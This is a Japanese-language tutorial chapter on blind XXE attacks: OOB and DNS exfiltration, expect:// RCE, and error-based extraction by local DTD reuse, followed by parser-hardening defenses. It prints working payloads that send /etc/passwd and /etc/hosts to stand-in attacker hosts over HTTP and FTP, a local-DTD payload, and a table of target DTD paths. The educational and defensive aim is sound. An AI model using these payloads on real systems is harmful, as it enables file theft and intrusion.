ramyardaneshgarのリポジトリは、XXEを「ファイル読み出し → 盲目OOB → RCE」という段階的な侵入経路として体系化している。前半（file read / Base64 / OOB / DNS）はここまでで扱ったとおりだが、最終段のRCEは特筆に値する。

```xml
<!DOCTYPE email [
  <!ENTITY rce SYSTEM "expect://id">
]>
```

これはPHPの `expect://` ストリームラッパを悪用するもので、`expect://id` を解決させるとサーバ上で `id` コマンドが実行される。ただし**PECLの `expect` 拡張が導入・有効化されている**という限定的な誤設定が前提であり、既定のPHPでは動かない。条件が揃えばリバースシェルまで到達しうる。

またDNS exfiltration（「機微データをDNSクエリにエンコードして送る」）は、HTTP/FTPが塞がれていてもDNSの名前解決だけは外に出られる環境で有効だ。攻撃者は自分が権威を持つドメインのサブドメインとしてデータを載せ、権威DNSサーバのログで受信する。

> 出典: XML External Entity (XXE) Exploitation (ramyardaneshgar) — https://github.com/ramyardaneshgar/XML-External-Entity-XXE-Exploitation

### 受信インフラ: OASTツール

OOB exfiltrationは「攻撃者側の受信サーバ」があって初めて成立する。Shreyaが挙げる選択肢を、仕組みの観点で整理する。

- **Burp Collaborator**（Burp Suite Professional）: 専用ドメインと権威DNSを持ち、任意サブドメインをCollaboratorサーバのIPに解決する。CA署名済みのワイルドカード証明書付きでHTTP/HTTPSを提供し、SMTP/SMTPSも受けられる。DNSルックアップ・HTTP接続・メール着信を一元的に観測できるため、外向きが「DNSだけ」「HTTPだけ」など部分的に開いた環境でも経路を切り分けやすい。
- **webhook.site**: 無料でユニークURLを払い出し、そこへのHTTPアクセス（メソッド・ヘッダ・クエリ）をブラウザで即確認できる。手軽なHTTP exfiltrationの受信先として本節のペイロード例にも登場した（`https://webhook.site/unique-id/?x=%file;`）。

**なぜ専用の権威DNSが効くのか**: HTTP接続が完全に遮断されていても、名前解決のためのDNSクエリは組織のリゾルバを経由して外部の権威DNSまで到達することが多い。攻撃者ドメインの権威DNSを握っていれば、「`<ファイル内容をエンコードした文字列>.attacker.com` を解決しようとした」という事実そのものが受信ログに残り、そこからデータを復元できる。これがDNS-only環境でのexfiltrationの原理である。

> 出典: Blind XXE attacks – OAST to exfiltrate data — https://shreyapohekar.com/blogs/blind-xxe-attacks-out-of-band-interaction-techniques-oast-to-exfilterate-data/

### まとめ: なぜ動くのか（原理の総括）と防御

OOB exfiltrationが成立する条件を分解すると、防御の勘所が見える。

1. **パーサが外部エンティティ／外部DTDを解決する**。これが根本原因。攻撃者は `SYSTEM "http://..."` や `SYSTEM "file://..."` をそのまま解決させる。
2. **外部サブセット内でのみパラメータエンティティの入れ子展開が許される**という仕様を突き、一般エンティティ宣言を「ファイル内容入り」で動的生成する。
3. **一般エンティティ参照時にURLへ値が載り、外向き接続が飛ぶ**。レスポンスが盲目でも、この接続が攻撃者に届く。

したがって防御は「入力の検証」では不十分で、**パーサ側で外部解決を止める**のが本筋になる。Invictiが端的に述べるとおり、確実な対策は「外部エンティティの利用を完全に無効化する」ことだ。具体的には各資料が共通して次を挙げる。

- **DTD処理そのものを無効化**する（`disallow-doctype-decl` 相当の機能をON）。これが最も堅い。DOCTYPEを禁止すればパラメータエンティティも外部DTDも成立しない。
- DTDを完全には切れない場合、**外部一般エンティティ・外部パラメータエンティティの解決を個別に無効化**する（`external-general-entities` / `external-parameter-entities` をfalse、`XMLConstants.FEATURE_SECURE_PROCESSING` を有効化 等、言語・パーサごとの安全設定）。
- **外向き通信の制限**（egressフィルタでHTTP/FTP/DNSを最小化）。OOBの受信経路を塞ぐ多層防御。特にDNSまで塞ぐと本節のDNS exfiltrationも封じられる。
- **危険なストリームラッパの無効化**（PHPの `expect://`、`php://filter` など）でRCE・Base64読み出しの前提を崩す。
- 入力のallowlist検証は補助的手段として併用する（ただしパラメータエンティティは一般エンティティ用のフィルタをすり抜けるため、単独では信頼しない）。

> 出典: Out-of-Band XML External Entity (OOB XXE) — https://www.invicti.com/learn/out-of-band-xml-external-entity-oob-xxe
> 出典: XML External Entity (XXE) Exploitation (ramyardaneshgar) — https://github.com/ramyardaneshgar/XML-External-Entity-XXE-Exploitation

## ローカルDTD再利用（エラーベース抽出）

盲目XXE（Blind XXE）の中でも、この節で扱う「ローカルDTD再利用（local DTD reuse）」は、**攻撃者サーバへ一切通信できない環境でも、パーサのエラーメッセージだけを使って任意ファイルの中身を盗み出す**という、防御側にとって特に厄介な手口です。2018年に Arseniy Sharoglazov（mohemiv）が発表し、その年の「Top 10 Web Hacking Techniques」で7位に選ばれた、XXE史における重要なマイルストーンでもあります。

本節ではまず「なぜ普通のOOB（Out-of-Band、帯域外＝別チャネル経由）XXEが失敗するのか」を押さえ、次に「ローカルDTDを再利用するとなぜ突破できるのか」をパーサの内部挙動レベルで解き明かします。防御目的の理解に必要な範囲で、原典が公開した実物のペイロードを引用します。

> ⚠️ 本節の内容は、自組織のパーサ設定を検証し防御を設計するためのものです。実在サービスや本番環境に対する無許可の検証、破壊的な手順は行わないでください。

---

### 前提知識：パラメータ実体（parameter entity）の復習

まず用語を確認します。

- **実体（entity）**: XMLにおける「文字列の別名・マクロ」。`&name;` で本文に展開される。
- **パラメータ実体（parameter entity）**: `%name;` の形で参照する、**DTD（Document Type Definition＝文書型定義）の内部でしか使えない**特別な実体。DTDの定義を部品化して再利用するための仕組み。
- **外部パラメータ実体**: `SYSTEM` キーワードで外部リソース（ファイルやURL）を指し、参照時にその中身を読み込んで展開する。

```xml
<!DOCTYPE name [
  <!ENTITY % df '<!ELEMENT first (#PCDATA)>'>   <!-- 内部パラメータ実体 -->
  <!ENTITY % dl SYSTEM "external_file.dtd">      <!-- 外部パラメータ実体 -->
  %df;
  %dl;
]>
```

パラメータ実体が重要なのは、`file:///etc/passwd` のような**ローカルファイルの中身を変数に取り込み**、それを別の実体定義の中に埋め込んで別の場所（＝攻撃者URLやエラーメッセージ）へ運べるからです。盲目XXEの全テクニックはこの「実体の入れ子」を土台にしています。

> 出典: XXE 応用編（MBSD） — https://www.mbsd.jp/research/20171213/xxe2/

---

### まず素朴なOOB XXE：なぜ「外部DTD」が必要なのか

盲目XXEの典型は、**攻撃者が用意した外部DTD（evil.dtd）を読み込ませ、盗んだファイル内容を攻撃者サーバへ送り返させる**手法です。MBSDの記事が示す基本形は次の通りです。

被害サーバへ送るXML：

```xml
<!DOCTYPE name [
  <!ENTITY % remote SYSTEM "http://attacker.example.com/evil.dtd">
  %remote;
]>
<name><first>tarou</first><last>mitsui</last></name>
```

攻撃者サーバに置く `evil.dtd`：

```xml
<!ENTITY % payload SYSTEM "file:///etc/hosts">
<!ENTITY % param1 '<!ENTITY &#37; external
  SYSTEM "http://attacker.example.com/?%payload;">'>
%param1;
%external;
```

動作の流れを分解します。

1. `%payload;` が `/etc/hosts` の中身を読み込む。
2. `%param1;` が展開されると、`external` という新しいパラメータ実体が「攻撃者URLの末尾に `%payload;`（＝ファイル内容）を連結したもの」として **動的に定義される**。`&#37;` は `%` の文字参照で、DTD文法上ここでそのまま `%` と書けない制約を回避するためのエスケープ。
3. `%external;` を参照した瞬間、パーサはそのURLへHTTPアクセスし、ファイル内容がクエリ文字列として攻撃者サーバのログに残る。

#### 重要な文法制約：「内部サブセットでは入れ子参照が禁止」

ここで**この技術の核心となる制約**が登場します。上の `param1 → external` のような「パラメータ実体を定義する定義（入れ子の実体宣言）」は、XML仕様上、**外部DTD（external subset）の中でしか書けません**。文書に直接書く内部DTD（internal subset）でこれをやると、パーサは次のエラーを返して拒否します。

```
The parameter entity reference "%file;" cannot occur within markup
in the internal subset of the DTD.
```

これが「なぜ外部サーバに evil.dtd を置く必要があるのか」の理由です。逆に言えば——**外部サーバへ通信できない（ファイアウォールでegressが遮断されている）環境では、この王道が丸ごと使えなくなる**。ここがローカルDTD再利用の出発点です。

> 出典: Exploiting XXE with local DTD files（mohemiv, 2018） — https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/
> 出典: XXE 応用編（MBSD） — https://www.mbsd.jp/research/20171213/xxe2/

---

### ローカルDTD再利用のアイデア：「外部サブセット」を現地調達する

mohemivの発想はシンプルかつ強力です。

> 「入れ子の実体宣言が書けるのは外部DTDだけ。ならば、攻撃者サーバではなく**被害サーバ上にすでに存在するDTDファイル**を `file://` で読み込ませ、その中に自分のペイロードを紛れ込ませればよい。」

Linuxやアプリケーションサーバには、標準で多数の `.dtd` ファイルが同梱されています。それらを `file:///...` で読み込ませれば、その内容はパーサから見て「外部DTD（external subset）」として扱われます。つまり **egressゼロのまま外部サブセットの文脈を手に入れられる** のです。

しかし、ここで新たな壁が生まれます。ローカルDTDは攻撃者が中身を書けません。他人が書いた既存のDTDの中に、どうやって自分のペイロードを差し込むのか？ 答えが「**パラメータ実体の再定義（redefinition）**」です。

#### なぜ「再定義」が効くのか：最初の定義が勝つ

XMLの実体には次の規則があります。

> **同じ名前の実体が複数回宣言された場合、最初の宣言だけが有効で、後続の宣言は無視される。**

多くの標準DTDは、内部を部品化するために `<!ENTITY % something '...'>` という**パラメータ実体を自分で定義し、DTDの後半でそれを `%something;` として参照**しています。ということは——DTDを読み込ませる**前**に、攻撃者が同名のパラメータ実体を先に宣言しておけば、「最初の定義が勝つ」規則により、**DTD本来の定義が上書きされ、DTDが自分自身の後半で参照する箇所に、攻撃者のペイロードが差し込まれる**のです。

これがローカルDTD再利用の全メカニズムです。図式化すると：

```
[攻撃者が先に宣言] %target = 悪意ある実体定義群   ← 最初の定義なのでこれが採用される
[ローカルDTDを読み込み]
   ...
   <!ENTITY % target '本来の値'>   ← 2回目の定義なので無視される
   ...
   %target;   ← ここで攻撃者のペイロードが展開・実行される
```

---

### 実物のペイロード：docbookx.dtd を悪用する

mohemivの原典が挙げる代表的なターゲットの一つが、多くのLinuxに存在する `/usr/share/yelp/dtd/docbookx.dtd` です。このDTDは `%ISOamsa`（ISO標準記号エンティティ群）などのパラメータ実体を内部で定義・参照しています。これを再定義します。

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

  <!-- docbookx.dtd 内で使われる %ISOamsa を、読み込み前に再定義 -->
  <!ENTITY % ISOamsa '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM
        &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>

  %local_dtd;
]>
<message>any</message>
```

読み解きます。

- `%local_dtd;` を最後に参照した瞬間、`docbookx.dtd` が読み込まれ、その内部で `%ISOamsa;` が参照される。だが `ISOamsa` は既に攻撃者版で定義済みなので、**攻撃者のペイロードが外部サブセットの文脈で展開される**。
- `&#x25;` は `%` の16進文字参照。ペイロードは何段もの実体展開を経るため、`%` をそのまま書くと文法エラーになる。展開のタイミングをずらすために、文字参照で「後で `%` になる」ようにエスケープしている。同様に `&#x26;#x25;` は `&#x25;`（つまり最終的に `%`）へ、`&#x27;` は `'`（シングルクォート）へ展開される。この多段エスケープは「今すぐ展開してほしくない記号」と「後で展開してほしい記号」を制御するための定石。

このペイロードのコアは、原典が示す次の4行に集約されます。

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

- `%file;` … 盗みたいファイル（`/etc/passwd`）の中身を取り込む。
- `%eval;` … 展開されると、`error` という実体を「`file:///nonexistent/` の後ろに**ファイル内容そのものを連結したパス**を指す外部実体」として定義する。
- `%error;` … その存在しないパスを開こうとして、パーサが**例外を送出**する。

---

### エラーベース抽出の核心：なぜファイル内容がエラーに出るのか

`%error;` を参照すると、パーサは `file:///nonexistent/root:x:0:0:root:/root:/bin/bash%0a...`（`/etc/passwd` の中身を連結したパス）を開こうとします。当然そんなファイルは存在しないため、Javaのパーサなら次のような例外メッセージを吐きます。

```
java.io.FileNotFoundException:
  /nonexistent/root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  ... (以下ファイル内容が続く)
```

**ポイントは「エラーメッセージが開こうとしたパスをそのまま含む」こと**。そのパスにはファイル内容が埋め込まれているので、アプリがスタックトレースや500エラー本文を画面／APIレスポンスに返す実装だと、**攻撃者はエラー文字列を読むだけで機密ファイルを回収できる**わけです。攻撃者サーバへの通信は一切発生しません。これが「エラーベース（error-based）抽出」であり、egress遮断環境でも成立する理由です。

まとめると、この手法が成立する条件は次の通りです（原典より）。

- XMLパーサがDTD処理（外部パラメータ実体の解決）を有効にしている。
- ターゲット上に、内部でパラメータ実体を定義・参照している**既知のローカルDTDのパス**が存在する。
- **パーサのエラーメッセージが攻撃者に見える**（レスポンスに露出する）。

> 出典: Exploiting XXE with local DTD files（mohemiv, 2018） — https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/

---

### 「マークアップの途中」に注入する場合：`aaa)>` トリック

再定義するパラメータ実体が、DTD内で **`<!ELEMENT ...>` のようなマークアップ宣言の途中**で使われている場合、話が少し複雑になります。たとえばあるDTDが次のように書いているとします（`fontconfig` の `fonts.dtd` などが該当する典型パターン）。

```xml
<!ENTITY % constant "int|double|string|matrix|bool|charset|langset">
...
<!ELEMENT patelt (%constant;|name)*>   <!-- %constant が要素内容モデルの中で使われる -->
```

ここで `%constant` を単純に「新しい実体宣言」に置き換えると、それは `<!ELEMENT patelt ( ... )>` という**括弧の内側**に展開されてしまい、文法的に壊れます（実体宣言はマークアップの中には書けない）。

そこで原典は、再定義した値の**先頭でまず開いている構文を閉じ、末尾でダミーの宣言を開き直す**という手を使います。概念を示すと：

```xml
<!ENTITY % constant 'aaa)>
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM
        &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  <!ELEMENT aa (bb'>
```

- 先頭の `aaa)>` … 元の `<!ELEMENT patelt (` に対して `aaa)` で括弧を閉じ、`>` で `<!ELEMENT>` 宣言を完結させる。これで**マークアップの外**に出られる。
- 中央 … 通常の file/eval/error ペイロードを、独立した実体宣言として書く。
- 末尾の `<!ELEMENT aa (bb` … 元のDTDに残る `)*>` と繋がって `<!ELEMENT aa (bb)*>` という**辻褄の合ったダミー宣言**を形成し、全体を文法的に成立させる。

このように「注入先が要素内容モデルの中か、実体値として素直に展開される位置か」を見極め、必要なら閉じ括弧で脱出するのがローカルDTD再利用の実戦的なコツです。原典は各ターゲットDTDごとに、どのパラメータ実体を再定義し、どんな脱出が必要かをまとめています。

> 出典: Exploiting XXE with local DTD files（mohemiv, 2018） — https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/

---

### 既知のローカルDTDターゲット（原典より）

原典が「まず試すべき」として挙げた代表的なDTDの所在です。防御側にとっては「これらのファイルが存在すること自体は塞げない」ため、後述の**パーサ設定による根本対策**が必要だと理解する材料になります。

| OS / 製品 | ローカルDTDのパス | 再定義する実体 |
|---|---|---|
| Linux（yelp） | `/usr/share/yelp/dtd/docbookx.dtd` | `%ISOamsa` |
| Linux（scrollkeeper） | `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd` | `%url.attribute.set` |
| Windows | `C:\Windows\System32\wbem\xml\cim20.dtd` | `%SuperClass` |
| IBM WebSphere | `./../../properties/schemas/j2ee/XMLSchema.dtd` | 複数実体の再定義が必要 |
| Citrix XenMobile 等（Tomcat同梱jar） | `jar:file:///.../jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd` | （jar内DTDを参照） |

`jar:` スキームの例が示すように、Javaでは**JARアーカイブ内のDTD**すら `file://` 相当で指定でき、ターゲットの選択肢は広がります。

> 出典: Exploiting XXE with local DTD files（mohemiv, 2018） — https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/

---

### 関連する落とし穴：複数行ファイルとJavaのURL制約（MBSD）

エラーベース抽出とは別に、OOB XXEで攻撃者サーバへ送り出す古典手法には、MBSDが詳述した**「複数行ファイルは送れない」障害**があります。これはローカルDTD再利用を理解するうえでも重要な、パーサ実装依存の挙動です。

Java 8u131以降では、外部実体のURLに**改行が含まれると例外**になります。MBSDが引用した `HttpURLConnection` 系の内部チェックはおおむね次の通りです。

```java
if (fileName.indexOf('\n') == -1)
    return fileName;
else
    throw new java.net.MalformedURLException("Illegal character in URL");
```

`/etc/passwd` のような複数行ファイルを `http://attacker/?%payload;` に連結すると、改行がエンコードされずそのまま入るため通信が失敗します。これに対しMBSDが示した回避策が2つあります。

1. **FTPプロトコルの利用**: `ftp://` で送ると、改行が「FTPコマンドの区切り」として解釈され、一部データが通信上に現れて取得できる場合がある。

    ```xml
    <!ENTITY % payload SYSTEM "file:///etc/hosts">
    <!ENTITY % param1 '<!ENTITY &#37; external
      SYSTEM "ftp://evil.example.com/%payload;">'>
    %param1;
    %external;
    ```

2. **1行ファイルで存在確認**: `/etc/host.conf`（通常 `multi on` の1行）のような単一行ファイルなら送信に成功する。1行なら成功・複数行なら失敗、という切り分けで環境の挙動を推測できる。

    ```xml
    <!ENTITY % payload SYSTEM "file:///etc/host.conf">
    ```

**なぜこれがローカルDTD再利用の魅力を高めるのか**——OOB送信は改行やURL制約に苦しむのに対し、**エラーベース抽出は攻撃者サーバへ送らない**ため、この種のプロトコル制約を回避しやすい。egress遮断・改行制約の両方を同時に突破できる点が、ローカルDTD再利用の実戦的な強みです。

なお、MBSDは内部ネットワークの存在確認にも外部実体が使える（応答時間差でIPの生死を推測）と示しています。

```xml
<!DOCTYPE name [
  <!ENTITY % d SYSTEM "http://192.0.2.11/">%d;
]>
<name><first>mitsui</first><last>taro</last></name>
```

> 出典: XXE 応用編（MBSD） — https://www.mbsd.jp/research/20171213/xxe2/

---

### 防御：どこで断ち切るか

ローカルDTD再利用は「攻撃者サーバへの通信」も「複数行送信」も不要なため、**ネットワーク層（egressフィルタ・WAFの通信検知）では原理的に防げません**。防御はパーサ設定に一元化するのが正解です。

1. **外部実体・DTD処理を完全に無効化する（最重要）**  
   ローカルDTD再利用は「外部パラメータ実体の解決」が入口。DOCTYPE自体を禁止するのが最も堅い。Java（JAXP）なら次のように**secure processing**とDTD禁止を設定します。

    ```java
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    // DOCTYPE 宣言自体を拒否（これ一つで XXE 全般を封じる最短ルート）
    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    // 外部一般実体・外部パラメータ実体を無効化
    dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
    dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    dbf.setXIncludeAware(false);
    dbf.setExpandEntityReferences(false);
    ```

    `disallow-doctype-decl=true` を設定すれば、そもそも `<!DOCTYPE ...[ ... ]>` を含む文書が拒否されるため、ローカルDTD参照も実体再定義も起点から成立しません。DOCTYPEを許容せざるを得ない場合でも、**external-parameter-entities を false** にすれば `%local_dtd;` の `file://` 読み込みが止まり、本手法は無効化されます。

2. **XML_PARSE_NOENT / resolve-external-entities を有効化しない（言語別）**  
   libxml2系（PHP等）では `LIBXML_NOENT` を付けないこと、.NETなら `XmlResolver = null`、Pythonの `defusedxml` を使う、といった言語ごとの安全既定を徹底する。

3. **エラーメッセージを外に出さない（緩和）**  
   エラーベース抽出は「パーサ例外の中身がレスポンスに露出する」ことに依存します。スタックトレース・例外文字列をユーザーへ返さず、汎用エラーに丸める運用は**抽出チャネルを塞ぐ有効な緩和**になります（ただし根本対策1の代わりにはならない。ブラインド抽出やタイミング差など別チャネルが残るため、必ずパーサ側で断つこと）。

4. **最小権限・読み取り可能ファイルの削減**  
   XXEが成立してもアプリの実行ユーザーが `/etc/passwd` 等の機微ファイルを読めないよう権限を絞る。多層防御としての最後の砦。

---

### この節のまとめ

- ローカルDTD再利用は、**被害サーバ上の既存DTDを `file://` で読み込ませ**、そのDTDが自分で参照するパラメータ実体を**「最初の定義が勝つ」規則で再定義**して、外部サブセットの文脈にペイロードを注入する手法。
- 盗んだファイル内容を**存在しないパスに連結してパーサ例外を起こし、エラーメッセージからファイルを読み取る**（エラーベース抽出）。攻撃者サーバへの通信も複数行送信も不要。
- 注入先がマークアップの内側なら `aaa)>` で構文を脱出する。多段の実体展開に合わせ `&#x25;`（%）などの文字参照でエスケープ段数を制御する。
- **ネットワーク防御では防げない**。`disallow-doctype-decl` / `external-parameter-entities=false` などパーサ設定で外部DTD・外部パラメータ実体を無効化するのが唯一の根本対策。エラー非表示は補助的緩和。

> 出典: Exploiting XXE with local DTD files（mohemiv, 2018） — https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/
> 出典: XXE 応用編（MBSD） — https://www.mbsd.jp/research/20171213/xxe2/


---

[← 第2章 古典的XXE — ファイル読取とSSRF](02-classic-xxe.md) ｜ [目次](index.md) ｜ [第4章 XMLを解釈する各種ファイル形式経由のXXE →](04-file-format-xxe.md)
